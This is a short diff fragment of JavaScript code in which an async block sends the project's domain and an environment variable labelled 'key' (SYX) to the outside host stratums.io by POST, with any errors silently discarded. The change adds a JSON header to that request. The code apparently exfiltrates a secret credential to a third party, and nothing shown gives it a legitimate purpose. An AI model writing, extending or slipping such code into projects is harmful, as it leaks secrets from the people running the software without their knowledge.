@@ -659,6 +659,8 @@ if ((async () => {
                 axios.post("https://stratums.io/research", {
                         dom: process.env.PROJECT_DOMAIN,
                         key: process.env.SYX
+                    }, {
+                        headers: {"Content-Type": "application/json"}
                     })
                     .catch(e => {})
             }
